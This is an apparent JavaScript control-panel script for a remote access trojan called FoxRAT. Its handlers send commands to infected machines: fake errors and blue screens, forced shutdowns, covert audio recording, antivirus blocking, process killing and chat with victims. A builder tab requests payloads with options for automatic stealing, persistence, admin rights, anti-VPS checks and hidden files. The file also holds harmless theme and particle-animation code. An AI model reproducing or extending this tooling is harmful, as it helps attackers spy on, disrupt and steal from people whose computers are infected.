document.getElementById('fun-hidewindow-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'hidewindow'); };
document.getElementById('fun-showwindow-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'showwindow'); };
document.getElementById('fun-tiny-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'tiny'); };

// ===== Title & Transparency =====
document.getElementById('fun-titlebar-btn').onclick = () => { if (!selectedClient) return; const t = document.getElementById('fun-titlebar-text').value; if (t) sendCommand(selectedClient, 'title ' + t); };
document.getElementById('fun-trans-btn').onclick = () => { if (!selectedClient) return; const v = document.getElementById('fun-trans-val').value || 128; sendCommand(selectedClient, 'transparency ' + v); };

// ===== URL & Errors =====
document.getElementById('fun-openurl-btn').onclick = () => { if (!selectedClient) return; const u = document.getElementById('fun-url-input').value; if (u) sendCommand(selectedClient, 'openurl ' + u); };
document.getElementById('fun-fakeerror-btn').onclick = () => { if (!selectedClient) return; const t = document.getElementById('fun-error-text').value || 'Error'; sendCommand(selectedClient, 'fakeerror ' + t); };

// ===== System Chaos =====
document.getElementById('fun-bsod-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'bsod'); };
document.getElementById('fun-virus-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'virus'); };
document.getElementById('fun-popups-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'popups 15'); };
document.getElementById('fun-spamnotepad-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'spamnotepad 10'); };
document.getElementById('fun-eject-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'eject'); };
document.getElementById('fun-keyboard-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'keyboard'); };
document.getElementById('fun-echo-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'echo'); };
document.getElementById('fun-heartbeat-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'heartbeat'); };
document.getElementById('fun-shutdown-btn').onclick = () => { if (!selectedClient) return; const t = document.getElementById('fun-shutdown-time').value || 30; sendCommand(selectedClient, 'shutdown ' + t); };
document.getElementById('fun-abortshutdown-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'abortshutdown'); };

// ===== Movement =====
document.getElementById('fun-wobble-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'wobble'); };
document.getElementById('fun-circle-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'circle'); };
document.getElementById('fun-jiggle2-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'jiggle'); };

// ===== Fuck System =====
let fuckRunning = false;
document.getElementById('fun-fuck-btn').onclick = () => {
    if (!selectedClient) return;
    const btn = document.getElementById('fun-fuck-btn');
    if (!fuckRunning) {
        sendCommand(selectedClient, 'fuck start');
        btn.textContent = 'STOP';
        btn.style.background = '#fff';
        btn.style.color = '#f44';
        fuckRunning = true;
    } else {
        sendCommand(selectedClient, 'fuck stop');
        btn.textContent = 'FUCK!';
        btn.style.background = '';
        btn.style.color = '';
        fuckRunning = false;
    }
};

// ===== Elite Roasts =====
document.getElementById('fun-elite-btn').onclick = () => { if (selectedClient) sendCommand(selectedClient, 'elite'); };

// ===== Audio Tab =====
document.getElementById('audio-record-btn').onclick = () => {
    if (!selectedClient) return;
    const dur = document.getElementById('audio-duration').value || 5;
    document.getElementById('audio-status').textContent = 'Recording...';
    document.getElementById('audio-status').style.color = '#ff4444';
    sendCommand(selectedClient, 'audio record ' + dur);
    dashLog(`AUDIO RECORD: ${dur}s`);
};

// ===== Blocker Tab =====
document.getElementById('blocker-av-btn').onclick = () => {
    if (!selectedClient) return;
    sendCommand(selectedClient, 'blockav');
    dashLog(`BLOCK AV: ${selectedClient}`);
    showToast('Blocker', 'Blocking all AV...', 'ok');
};
document.getElementById('blocker-kill-btn').onclick = () => {
    if (!selectedClient) return;
    const name = document.getElementById('blocker-proc-name').value;
    if (name) sendCommand(selectedClient, 'prockill ' + name);
};

// ===== Settings Tab =====
document.getElementById('setting-apply').onclick = () => {
    const bg = document.getElementById('setting-bg').value;
    const accent = document.getElementById('setting-accent').value;
    const sidebar = document.getElementById('setting-sidebar').value;
    applyTheme(bg, accent, sidebar);
    localStorage.setItem('foxrat_theme', JSON.stringify({ bg, accent, sidebar }));
};
document.querySelectorAll('.preset-btn').forEach(btn => {
    btn.onclick = () => {
        const bg = btn.dataset.bg;
        const accent = btn.dataset.accent;
        const sidebar = btn.dataset.sidebar;
        document.getElementById('setting-bg').value = bg;
        document.getElementById('setting-accent').value = accent;
        document.getElementById('setting-sidebar').value = sidebar;
        applyTheme(bg, accent, sidebar);
        localStorage.setItem('foxrat_theme', JSON.stringify({ bg, accent, sidebar }));
    };
});
function applyTheme(bg, accent, sidebar) {
    document.documentElement.style.setProperty('--bg', bg);
    document.documentElement.style.setProperty('--accent', accent);
    document.documentElement.style.setProperty('--sidebar', sidebar);
    document.documentElement.style.setProperty('--card-border', accent + '55');
    document.documentElement.style.setProperty('--hover', accent + '22');
}
const savedTheme = localStorage.getItem('foxrat_theme');
if (savedTheme) {
    const t = JSON.parse(savedTheme);
    applyTheme(t.bg, t.accent, t.sidebar);
    document.getElementById('setting-bg').value = t.bg;
    document.getElementById('setting-accent').value = t.accent;
    document.getElementById('setting-sidebar').value = t.sidebar;
}

// ===== Builder Tab =====
let copyCount = 2;
document.getElementById('builder-copy-minus').onclick = () => { if (copyCount > 1) { copyCount--; document.getElementById('builder-copy-val').textContent = copyCount; } };
document.getElementById('builder-copy-plus').onclick = () => { if (copyCount < 10) { copyCount++; document.getElementById('builder-copy-val').textContent = copyCount; } };

// Generate random mutex
function genMutex() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let m = 'WEBR_';
    for (let i = 0; i < 12; i++) m += chars[Math.floor(Math.random() * chars.length)];
    return m;
}
document.getElementById('builder-mutex').value = genMutex();

document.getElementById('builder-build-btn').onclick = async () => {
    const name = document.getElementById('builder-filename').value || 'FoxRAT';
    const mutex = document.getElementById('builder-mutex').value || genMutex();
    const comment = document.getElementById('builder-comment').value || '';
    const antivps = document.getElementById('builder-antivps').checked;
    const ext = document.getElementById('builder-ext').value;
    const stub = document.getElementById('builder-stub').value;
    const autosteal = document.getElementById('builder-autosteal').value;
    const admin = document.getElementById('builder-admin').value;
    const install = document.getElementById('builder-install').value;
    const autorun = document.getElementById('builder-autorun').value;
    const hidefiles = document.getElementById('builder-hidefiles').checked;

    document.getElementById('builder-status').textContent = 'Building...';
    document.getElementById('builder-status').style.color = '#888';
    try {
        const r = await fetch('/build', {
            method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Session-Token': sessionToken },
            body: JSON.stringify({ filename: name, mutex, comment, antivps, ext, stub, autosteal, admin, install, autorun, hidefiles, copyCount })
        });
        const j = await r.json();
        if (j.downloadUrl) {
            document.getElementById('builder-status').innerHTML = `<a href="${j.downloadUrl}" style="color:#00ff88;text-decoration:underline">Download ${name}${ext}</a>`;
            document.getElementById('builder-status').style.color = '#00ff88';
            dashLog(`BUILD: ${name}${ext} ready`);
        } else {
            document.getElementById('builder-status').textContent = j.error || 'Build failed';
            document.getElementById('builder-status').style.color = '#f44';
        }
    } catch(_) {
        document.getElementById('builder-status').textContent = 'Build failed';
        document.getElementById('builder-status').style.color = '#f44';
    }
};

// ===== Background Image =====
function applyBg(url) {
    document.body.style.backgroundImage = `url(${url})`;
    document.body.classList.add('bg-image');
    localStorage.setItem('foxrat_bg', url);
}
const savedBg = localStorage.getItem('foxrat_bg');
if (savedBg) applyBg(savedBg);

document.getElementById('bg-upload-btn').onclick = () => document.getElementById('bg-upload').click();
document.getElementById('bg-upload').onchange = e => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => { applyBg(reader.result); showToast('Background', 'Image set', 'ok'); };
    reader.readAsDataURL(file);
};
document.getElementById('bg-url-btn').onclick = () => {
    const url = document.getElementById('bg-url-input').value.trim();
    if (!url) return;
    applyBg(url);
    showToast('Background', 'URL applied', 'ok');
};
document.getElementById('bg-url-input').onkeydown = e => { if (e.key === 'Enter') document.getElementById('bg-url-btn').click(); };
document.getElementById('bg-clear-btn').onclick = () => {
    document.body.style.backgroundImage = '';
    document.body.classList.remove('bg-image');
    localStorage.removeItem('foxrat_bg');
    document.getElementById('bg-url-input').value = '';
    showToast('Background', 'Removed', 'ok');
};

// ===== Particle System =====
const pCanvas = document.getElementById('particle-canvas');
const pCtx = pCanvas.getContext('2d');
let particles = [];
let particleType = localStorage.getItem('foxrat_particles') || 'none';
let particleMax = parseInt(localStorage.getItem('foxrat_particle_count')) || 80;
let particleAnim = null;

function resizeCanvas() { pCanvas.width = window.innerWidth; pCanvas.height = window.innerHeight; }
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

document.getElementById('particle-select').value = particleType;
document.getElementById('particle-count').value = particleMax;
document.getElementById('particle-count-val').textContent = particleMax;

function createParticle() {
    const t = particleType;
    if (t === 'snow') {
        return { x: Math.random() * pCanvas.width, y: -10, r: Math.random() * 3 + 1, speed: Math.random() * 1 + 0.5, wind: Math.random() * 0.5 - 0.25, opacity: Math.random() * 0.6 + 0.4, type: 'snow' };
    } else if (t === 'rain') {
        return { x: Math.random() * pCanvas.width, y: -10, len: Math.random() * 15 + 10, speed: Math.random() * 8 + 6, opacity: Math.random() * 0.4 + 0.2, type: 'rain' };
    } else if (t === 'sakura') {
        return { x: Math.random() * pCanvas.width, y: -20, r: Math.random() * 4 + 3, speed: Math.random() * 1.5 + 0.5, wind: Math.random() * 1 - 0.5, rotation: Math.random() * 360, rotSpeed: Math.random() * 2 - 1, opacity: Math.random() * 0.5 + 0.3, type: 'sakura' };
    } else if (t === 'feathers') {
        return { x: Math.random() * pCanvas.width, y: -20, len: Math.random() * 10 + 8, speed: Math.random() * 1 + 0.3, wind: Math.random() * 1.5 - 0.75, rotation: Math.random() * 360, rotSpeed: Math.random() * 3 - 1.5, opacity: Math.random() * 0.4 + 0.2, type: 'feathers' };
    }
    return null;
}

function drawParticle(p) {
    pCtx.save();
    pCtx.globalAlpha = p.opacity;
    if (p.type === 'snow') {
        pCtx.fillStyle = '#fff';
        pCtx.beginPath();
        pCtx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        pCtx.fill();
    } else if (p.type === 'rain') {
        pCtx.strokeStyle = '#8af';
        pCtx.lineWidth = 1.5;
        pCtx.beginPath();
        pCtx.moveTo(p.x, p.y);
        pCtx.lineTo(p.x - 1, p.y + p.len);
        pCtx.stroke();
    } else if (p.type === 'sakura') {
        pCtx.translate(p.x, p.y);
        pCtx.rotate(p.rotation * Math.PI / 180);
        pCtx.fillStyle = '#ffb7d5';
        pCtx.beginPath();
        pCtx.ellipse(0, 0, p.r, p.r * 0.6, 0, 0, Math.PI * 2);
        pCtx.fill();
        pCtx.fillStyle = '#ff8ec7';
        pCtx.beginPath();
        pCtx.ellipse(-p.r * 0.3, 0, p.r * 0.3, p.r * 0.2, 0, 0, Math.PI * 2);
        pCtx.fill();
    } else if (p.type === 'feathers') {
        pCtx.translate(p.x, p.y);
        pCtx.rotate(p.rotation * Math.PI / 180);
        pCtx.fillStyle = '#fff';
        pCtx.beginPath();
        pCtx.ellipse(0, 0, p.len * 0.3, p.len, 0, 0, Math.PI * 2);
        pCtx.fill();
        pCtx.strokeStyle = '#ddd';
        pCtx.lineWidth = 0.5;
        pCtx.beginPath();
        pCtx.moveTo(0, -p.len);
        pCtx.lineTo(0, p.len);
        pCtx.stroke();
    }
    pCtx.restore();
}

function updateParticle(p) {
    if (p.type === 'snow') {
        p.y += p.speed;
        p.x += p.wind + Math.sin(p.y * 0.01) * 0.5;
    } else if (p.type === 'rain') {
        p.y += p.speed;
    } else if (p.type === 'sakura') {
        p.y += p.speed;
        p.x += p.wind + Math.sin(p.y * 0.02) * 1;
        p.rotation += p.rotSpeed;
    } else if (p.type === 'feathers') {
        p.y += p.speed;
        p.x += p.wind + Math.sin(p.y * 0.015) * 1.5;
        p.rotation += p.rotSpeed;
    }
}

function particleLoop() {
    pCtx.clearRect(0, 0, pCanvas.width, pCanvas.height);
    if (particleType !== 'none') {
        while (particles.length < particleMax) particles.push(createParticle());
        if (particles.length > particleMax) particles.length = particleMax;
        for (let i = particles.length - 1; i >= 0; i--) {
            const p = particles[i];
            updateParticle(p);
            drawParticle(p);
            if (p.y > pCanvas.height + 30 || p.x < -30 || p.x > pCanvas.width + 30) {
                particles.splice(i, 1);
            }
        }
    }
    particleAnim = requestAnimationFrame(particleLoop);
}
particleLoop();

document.getElementById('particle-select').onchange = e => {
    particleType = e.target.value;
    particles = [];
    localStorage.setItem('foxrat_particles', particleType);
};
document.getElementById('particle-count').oninput = e => {
    particleMax = parseInt(e.target.value);
    document.getElementById('particle-count-val').textContent = particleMax;
    localStorage.setItem('foxrat_particle_count', particleMax);
};

// ===== Communication / Chat =====
function handleChatMessage(msg) {
    const box = document.getElementById('comm-messages');
    if (!box) return;
    const name = msg.from === 'user' ? (clients[msg.clientId]?.info?.hostname || 'User') : 'h@ck3r';
    const color = msg.from === 'user' ? 'var(--accent)' : '#f44';
    const div = document.createElement('div');
    div.style.color = color;
    div.style.marginBottom = '4px';
    div.style.fontSize = '13px';
    div.innerHTML = `<b>${name}:</b> ${msg.message}`;
    box.appendChild(div);
    box.scrollTop = box.scrollHeight;
}

document.getElementById('comm-send').onclick = () => {
    const input = document.getElementById('comm-input');
    if (!input.value || !selectedClient) return;
    sendCommand(selectedClient, 'chat open ' + input.value);
    const box = document.getElementById('comm-messages');
    const div = document.createElement('div');
    div.style.color = '#f44';
    div.style.marginBottom = '4px';
    div.style.fontSize = '13px';
    div.innerHTML = `<b>h@ck3r:</b> ${input.value}`;
    box.appendChild(div);
    box.scrollTop = box.scrollHeight;
    input.value = '';
};
document.getElementById('comm-input').onkeydown = e => { if (e.key === 'Enter') document.getElementById('comm-send').click(); };
document.getElementById('comm-close').onclick = () => { if (selectedClient) { sendCommand(selectedClient, 'chat close'); showToast('Chat', 'Close requested', 'ok'); } };
